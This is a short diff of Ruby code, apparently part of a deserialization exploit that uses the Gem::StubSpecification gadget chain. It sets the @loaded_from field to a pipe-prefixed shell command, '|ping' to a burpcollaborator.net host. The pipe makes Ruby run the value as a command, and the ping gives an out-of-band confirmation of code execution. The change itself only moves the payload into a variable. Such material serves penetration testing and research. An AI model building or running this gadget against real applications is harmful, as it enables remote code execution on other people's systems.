@@ -4,9 +4,9 @@ class Gem::StubSpecification
   def initialize; end
 end
 
-
+cmd="|ping xqr0wzwkcldkqz8asl6u4xrc0360up.burpcollaborator.net"
 stub_specification = Gem::StubSpecification.new
-stub_specification.instance_variable_set(:@loaded_from, "|ping xqr0wzwkcldkqz8asl6u4xrc0360up.burpcollaborator.net")
+stub_specification.instance_variable_set(:@loaded_from, cmd)
 
 class Gem::Source::SpecificFile
   def initialize; end
